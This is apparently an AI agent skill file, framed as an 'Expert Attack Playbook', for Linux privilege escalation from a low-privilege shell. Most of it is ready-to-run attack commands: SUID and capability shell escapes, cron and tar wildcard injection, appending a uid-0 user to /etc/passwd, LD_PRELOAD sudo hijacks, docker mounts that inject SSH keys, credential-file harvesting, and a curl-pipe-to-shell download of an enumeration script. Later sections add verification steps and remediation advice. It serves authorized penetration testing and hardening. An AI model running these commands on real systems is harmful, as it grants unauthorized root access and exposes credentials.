---
name: linux-privilege-escalation
description: >-
  Linux privilege escalation playbook. Use when you have low-privilege shell access and need to escalate to root via SUID/SGID binaries, capabilities, cron abuse, kernel exploits, misconfigurations, or credential harvesting on Linux systems.
---

# SKILL: Linux Privilege Escalation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Linux privesc techniques. Covers enumeration, SUID/SGID, capabilities, cron abuse, kernel exploits, NFS, writable passwd/shadow, LD_PRELOAD, Docker group, and library hijacking. Base models miss subtle escalation paths via capabilities and combined misconfigurations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target is a container and you need to escape to host
- [linux-security-bypass](../linux-security-bypass/SKILL.md) when facing restricted shells, AppArmor, SELinux, or seccomp
- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after obtaining root for pivoting to adjacent hosts
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when the host is a Kubernetes node

### Advanced Reference

Also load [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md) when you need:
- Top 30 SUID binaries with exact exploitation commands (GTFOBins)
- Capability-specific exploitation for each dangerous cap
- Custom SUID binary exploitation methodology

Also load [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md) when you need:
- Kernel version → exploit mapping table (DirtyPipe, DirtyCow, OverlayFS, etc.)
- Exploit compilation tips and cross-compilation notes
- Kernel exploit stability assessment

---

## 1. ENUMERATION CHECKLIST

Run these immediately after landing a shell:

### System Info

```bash
uname -a                        # Kernel version
cat /etc/os-release             # Distro and version
cat /proc/version               # Kernel compile info
hostname && id && whoami        # Current context
```

### Sudo & SUID/SGID

```bash
sudo -l                         # What can we run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
getcap -r / 2>/dev/null         # Files with capabilities
```

### Cron & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all     # systemd timers
```

### Writable Files & Dirs

```bash
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow  # Check permissions
find / -perm -o+w -type d 2>/dev/null   # World-writable dirs
```

### Network & Services

```bash
ss -tlnp                        # Listening services
cat /proc/net/tcp               # Raw TCP connections
ps aux                          # Running processes
env                             # Environment variables (credentials?)
```

### Credential Locations

```bash
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID EXPLOITATION

### GTFOBins Methodology

1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)
3. Use the "SUID" section specifically — not all binary abuse works with SUID

### Quick-Win SUID Escalations

| Binary | Command |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `cp` | Copy `/etc/passwd`, add root user, copy back |

### Shared Library Hijacking (SUID Binary)

```bash
ldd /usr/local/bin/suid_binary                    # Check loaded libraries
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # Find load paths

# If it loads from a writable directory — inject constructor:
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
```

---

## 3. CAPABILITIES ABUSE

| Capability | Risk | Exploitation |
|---|---|---|
| `cap_setuid` | **Critical** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **Critical** | Read/write any file regardless of permissions |
| `cap_dac_read_search` | **High** | Read any file — dump `/etc/shadow` |
| `cap_sys_admin` | **Critical** | Mount filesystems, BPF, namespace manipulation |
| `cap_sys_ptrace` | **High** | Inject into root processes via ptrace |
| `cap_net_raw` | **Medium** | Sniff traffic, ARP spoofing |
| `cap_net_bind_service` | **Low** | Bind to privileged ports (<1024) |
| `cap_fowner` | **High** | Change ownership of any file |

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: python3 with cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. CRON / TIMER ABUSE

### Writable Cron Scripts

```bash
# Find cron jobs running as root
cat /etc/crontab | grep root
ls -la /etc/cron.d/

# If a root-owned cron runs a script writable by current user:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh
# Wait for cron → /tmp/bash -p
```

### PATH Hijacking in Cron

```bash
# If crontab has: PATH=/home/user:/usr/local/bin:/usr/bin
# And runs: * * * * * root backup.sh (without full path)
# Create /home/user/backup.sh:
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
```

### Wildcard Injection (tar)

```bash
# If cron runs: tar czf /backup/archive.tar.gz *
# In the target directory, create:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# tar interprets filenames as arguments
```

### pspy — Monitor Processes Without Root

```bash
# Upload pspy64 or pspy32 to target
./pspy64
# Watch for cron jobs, services, and background processes
```

---

## 5. NFS NO_ROOT_SQUASH

```bash
# On attacker: check exported shares
showmount -e TARGET_IP

# If no_root_squash is set:
mount -t nfs TARGET_IP:/share /mnt/nfs
# As root on attacker box:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target:
/share/bash -p    # root shell
```

---

## 6. WRITABLE /etc/passwd OR /etc/shadow

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123
# → $1$xyz$...hash...

# Append root-equivalent user
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# Or replace root's 'x' with generated hash (if no shadow file)
```

### Writable /etc/shadow

```bash
# Generate SHA-512 hash
mkpasswd -m sha-512 password123

# Replace root's hash in /etc/shadow
```

---

## 7. LD_PRELOAD / LD_LIBRARY_PATH WITH SUDO

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
# Compile .so with _init() that calls setresuid(0,0,0) + system("/bin/bash -p")
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
```

---

## 8. DOCKER GROUP → ROOT

```bash
# If current user is in the docker group:
id    # check for "docker" in groups

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or add SSH key
docker run -v /root:/mnt --rm -it alpine sh -c \
  'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'
```

---

## 9. PYTHON / PERL / RUBY LIBRARY HIJACKING

```bash
# Python: if a root-executed script does "import somelib"
# Check python path order:
python3 -c 'import sys; print("\n".join(sys.path))'

# Place malicious module in writable path that comes first:
cat > /writable/path/somelib.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
EOF

# Perl: PERL5LIB / @INC manipulation
# Ruby: RUBYLIB / $LOAD_PATH manipulation
```

---

## 10. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **LinPEAS** | Comprehensive enumeration | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **linux-exploit-suggester** | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
| **pspy** | Monitor processes (no root needed) | `./pspy64` |
| **LinEnum** | Legacy enumeration | `./LinEnum.sh -t` |
| **GTFOBins** | SUID/sudo/capability abuse reference | https://gtfobins.github.io/ |

---

## 11. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell obtained
│
├── sudo -l shows entries?
│   ├── GTFOBins match? → exploit directly
│   ├── env_keep has LD_PRELOAD? → LD_PRELOAD hijack (§7)
│   ├── NOPASSWD on custom script? → review script for injection
│   └── (ALL) with password? → check for password reuse/hashes
│
├── SUID/SGID binaries found?
│   ├── Standard binary on GTFOBins? → SUID exploit (§2)
│   ├── Custom binary? → reverse engineer, check libs (strace/ltrace)
│   └── Shared lib from writable path? → library hijack (§2)
│
├── Capabilities on binaries?
│   ├── cap_setuid? → instant root (§3)
│   ├── cap_dac_override? → write /etc/passwd (§6)
│   ├── cap_sys_admin? → mount / namespace tricks
│   └── cap_sys_ptrace? → process injection
│
├── Cron jobs running as root?
│   ├── Writable script? → inject payload (§4)
│   ├── Missing full path? → PATH hijack (§4)
│   └── Uses wildcards? → wildcard injection (§4)
│
├── Writable sensitive files?
│   ├── /etc/passwd writable? → add root user (§6)
│   ├── /etc/shadow writable? → replace root hash (§6)
│   └── systemd unit files writable? → add ExecStartPre
│
├── Docker/LXD group membership?
│   └── Yes → mount host filesystem (§8)
│
├── NFS shares with no_root_squash?
│   └── Yes → SUID binary via NFS (§5)
│
├── Kernel version old/unpatched?
│   └── Check KERNEL_EXPLOITS_CHECKLIST.md
│
└── None of the above?
    ├── Run LinPEAS for comprehensive scan
    ├── Check for password reuse (bash_history, config files)
    ├── Check internal services (127.0.0.1 listeners)
    └── Monitor processes with pspy for hidden opportunities
```

---

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | What **identity and capability set** do you hold, from the host's own tools (`id`, `capsh`)? | the starting privilege |
| 2 | Which **specific misconfiguration** is the primitive, named exactly? | the fix location |
| 3 | Did the **control action fail** before the exploit ran? | escalation, not your baseline |
| 4 | Did `id` **change after** the technique executed? | the technique worked, not just ran |
| 5 | Did you **read something the new privilege reaches** (`/etc/shadow`, a root key)? | impact |
| 6 | Does the primitive exist on the **target's own host and distribution**? | applicability |
| 7 | Did you **revert** any change, with a query that returns nothing? | engagement integrity |

**The `id` before/after pair is the bar.** A technique that prints output but leaves you as the same user
has not escalated, and the pair is the whole evidence.

---

## 13. EXECUTION PRIMITIVES

Privilege escalation is proven by **an identity change, paired with the same action failing beforehand**.
Every block ends at `uid=0` or a read the new privilege unlocks.

### 13.1 Enumeration and the control baseline

```bash
id; uname -a; cat /etc/os-release 2>/dev/null | head -3
sudo -n -l 2>&1 | head -20
capsh --print 2>/dev/null | head -4 || grep Cap /proc/self/status
# THE CONTROL: the actions that must FAIL at your current level - record them verbatim
cat /etc/shadow 2>&1 | head -1
ls -la /root/ 2>&1 | head -2
cat /etc/sudoers 2>&1 | head -2
```

**Record the failing control first.** A shell is not a finding; the escalation and the misconfiguration
that granted it are the finding, and the failing control establishes the delta.

### 13.2 SUID and SGID, with the GTFOBins lookup

```bash
# the inventory, then the lookup, then the exercise - the order matters
find / -perm -4000 -type f 2>/dev/null | head -30
# the classic cases, each of which must actually produce uid=0
/usr/bin/find . -exec /bin/sh -p \; -quit 2>&1 | head -2; id
/usr/bin/vim -c ':!/bin/sh' 2>&1 | head -2
/usr/bin/nmap --interactive 2>&1 | head -2
/usr/bin/less /etc/shadow 2>&1 | head -2
# and the CONTROL: the same binary WITHOUT the setuid bit, which must not escalate
cp /usr/bin/find /tmp/find-nosuid 2>/dev/null; chmod u-s /tmp/find-nosuid 2>/dev/null
/tmp/find-nosuid . -exec id \; -quit 2>&1 | head -2
```

**The GTFOBins entry is the candidate; `uid=0` from exercising it is the finding.** The control copy
without the setuid bit is what proves the bit is what did it.

### 13.3 Capabilities, which are quieter than SUID

```bash
# the capability inventory - these are frequently overlooked in reviews
getcap -r / 2>/dev/null | head -20
# the exploitable ones, each exercised
python3 -c 'import os; os.setuid(0); os.system("id")' 2>&1 | head -2       # cap_setuid+ep on python
tar -cf /dev/null /etc/shadow 2>&1 | head -2                              # cap_dac_read_search
# and the control: the same binary without the capability
/usr/bin/python3 -c 'import os; print(os.getuid())' 2>&1 | head -2
```

**Each capability maps to one specific exploit.** `cap_setuid`, `cap_dac_read_search`,
`cap_dac_override`, and `cap_sys_admin` each have a distinct primitive, and the report should name
which one applied.

### 13.4 Sudo rules, with the control pair

```bash
sudo -n -l 2>&1 | grep -iE 'NOPASSWD|ALL|env_keep'
# the three exploitable rule shapes, each exercised
sudo -n /usr/bin/vim -c ':!id' 2>&1 | head -2
sudo -n LD_PRELOAD=/tmp/evil.so /usr/bin/somebinary 2>&1 | head -2
sudo -n /usr/bin/find / -exec /bin/sh -p \; -quit 2>&1 | head -2
# THE CONTROL: the same command WITHOUT sudo must fail to change identity
/usr/bin/vim -c ':!id' 2>&1 | head -2
```

**The control is the same command without `sudo`.** A `sudo` rule that runs a binary you could already
run is not an escalation; the rule that permits a shell or an environment override is.

### 13.5 Cron, systemd, and writable-path abuse

```bash
# cron: the entries, their scripts, and the ACL on each script
ls -la /etc/cron* /etc/cron.d 2>/dev/null | head -20
cat /etc/crontab 2>/dev/null | head -10
# the writable script, then the marker it produces - the pair
ls -la /opt/backup.sh 2>/dev/null
echo 'id > /tmp/cron-marker.txt' >> /opt/backup.sh 2>/dev/null; cat /tmp/cron-marker.txt 2>/dev/null
# systemd: the writable units and timers
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null | head -10
systemctl list-timers --all 2>/dev/null | head -10
# and the PATH-hijack case, which needs a relative binary in a root-run script
grep -rn 'system(' /etc/cron.d/ 2>/dev/null | head -5
```

**A writable script is the candidate; the root-owned marker is the finding.** Report the ACL that made
the path writable, because that is what the fix targets.

### 13.6 Kernel and component exploits, with the build check

```bash
uname -r; cat /proc/version 2>/dev/null
# the applicability check, which must run BEFORE attempting anything
python3 -c "
import re
k=open('/proc/version').read()
print('kernel:', re.search(r'Linux version (\S+)', k).group(1))
print('an exploit is only a candidate if the build falls in its affected range')"
# and after any kernel exploit, the mandatory verification
id
# the CONTAINER control: a kernel exploit that requires an unprivileged namespace
unshare -Ur 2>&1 | head -2
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
```

**Check the build against the CVE's affected range before attempting.** A kernel exploit run on a build
outside the range either crashes the host or silently fails, and reporting either is a false positive.

### 13.7 The end-to-end harness

```bash
python3 - <<'PY'
import subprocess
def sh(c): 
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30)
    return (r.stdout + r.stderr).strip()[:90]

print("BEFORE   :", sh("id"))
print("CAPS     :", sh("capsh --print 2>/dev/null | grep -i current"))
print("SUDO -n  :", sh("sudo -n -l 2>&1 | head -1"))
print()
print("CONTROL ACTIONS (these must FAIL now - record verbatim):")
print("  shadow   :", sh("cat /etc/shadow 2>&1 | head -1"))
print("  rootdir  :", sh("ls /root/ 2>&1 | head -1"))
print()
print("TECHNIQUE: <name> - <exact command>")
print("AFTER    :", "<id output>")
print()
print("REVERT   : remove every file, unit, cron entry, and authorized_keys line you added,")
print("           then re-run the CONTROL block above and show the same failures.")
PY
```

**Before, control, technique, after, revert.** A privesc report missing the before/after pair is
unverifiable, and this family is where that error is most common.

---

## 14. EVIDENCE STANDARD — CHAIN ARTEFACTS

| Item | Why |
|---|---|
| The **identity and capabilities before** | the baseline |
| The **control action that failed before** | proves escalation |
| The **misconfiguration, named exactly** (a SUID bit, a capability, a sudo rule, an ACL) | the fix location |
| The **exact command** | reproducibility |
| The **identity after** | the escalation result |
| The **read the new privilege unlocked** | impact |
| The **distribution and kernel version** | applicability |
| The **audit records** (`auth.log`, auditd, systemd journal) | the blue-team half |
| The **revert command and its empty verification query** | engagement integrity |
| That the host is the **target's, not a lab** | validity |

Report the **pair and the misconfiguration**: "as `www-data` with `CapEff: 0000000000000000`, `cat
/etc/shadow` returns `Permission denied` and `ls /root/` returns `Permission denied`, which are the
controls. `/usr/bin/find` carried the SUID bit (mode 4755, owner root) on Ubuntu 22.04 kernel
5.15.0-91; `/usr/bin/find . -exec /bin/sh -p \; -quit` returned `uid=0(root) gid=0(root)`, and the same
`cat /etc/shadow` then returned 4 hashes. A copy of the same binary with the setuid bit cleared does not
escalate, which confirms the bit is the cause. The binary was not modified; the finding is the ACL
state", never "the host is vulnerable to privesc".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A SUID binary **you never exercised** | a hardening note; exercise it or report exposure |
| `getcap` output with capabilities that have **no exploitable primitive** | most do not escalate |
| A sudo rule for a binary **that cannot spawn a shell or override the environment** | a constrained rule |
| A writable script **that never runs as root** | no path |
| A kernel exploit run on a build **outside the affected range** | it failed or crashed; not a finding |
| An escalation on a **host you built for the test** | tests your own environment |
| A container escape **with no host credential** | state the reach honestly |
| `sudo -l` output as an escalation claim, with no rule exercised | a configuration listing |
| A capability present but **the binary drops it before exec** | verify by exercising |
| A local root on a host where you **were already root** | no escalation |
| A recovered hash reproduced in full | a disclosure |

**The pair, or it is not an escalation.** The candidates in this document are abundant; the crossed
boundaries are not, and reporting the first as the second is the standard failure mode.

---

## 15. REMEDIATION REFERENCE

1. **Audit every SUID and SGID binary against GTFOBins and remove the bit from anything not required** - the SUID inventory is the highest-yield escalation list on any Linux host.
2. **Drop capabilities from binaries, and never grant `cap_setuid`, `cap_setgid`, `cap_dac_read_search`, or `cap_sys_admin` unnecessarily** - the capability path is quieter than SUID and equally effective.
3. **Remove `NOPASSWD` from `sudoers`, and never `env_keep` `LD_PRELOAD`, `LD_LIBRARY_PATH`, or `PYTHONPATH`** - these three rules turn a constrained `sudo` into a root shell.
4. **Restrict cron and systemd unit files to root with 0644 and their directories to root-only writes** - a writable unit or script is root execution on the next timer.
5. **Use absolute paths inside every root-run script, and set a safe `PATH` at the top of each** - the PATH hijack needs a relative invocation and it is removed by one line.
6. **Restrict the docker group and treat membership as root in the access model** - a docker-group member has a documented one-command path to host root.
7. **Apply `nosuid`, `nodev`, and `noexec` to user-writable mounts, and never `no_root_squash` on an NFS export** - the mount options are the entire mitigation for the NFS and mount paths.
8. **Keep the kernel and container runtime patched, and verify the build against recent local-escalation CVEs** - the kernel path is version-bound and the check is one command.
9. **Restrict `unprivileged_userns_clone` and the namespace creation rights where they are not needed** - it removes a whole class of container and kernel exploits.
10. **Enable `auditd` with rules for `execve`, `/etc/shadow` reads, and writes to `/etc/sudoers.d`** - every technique here generates an audit record on a configured host.
11. **Use a configuration-management baseline that enforces these settings and reports drift** - the findings in this document are drift from a baseline, and the fix is the baseline plus the drift check.

---

## 16. RELATED SIBLINGS - LOAD TOGETHER

- [linux-postexploit](../linux-postexploit/SKILL.md) - what follows once the boundary is crossed
- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) - the reach of the credential you obtain
- [container-escape-techniques](../container-escape-techniques/SKILL.md) - the container-to-host path
- [linux-privesc-gtfobins-master](../linux-privesc-gtfobins-master/SKILL.md) - the full SUID and shell-escape catalogue
- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) - the sibling playbook with the same control discipline
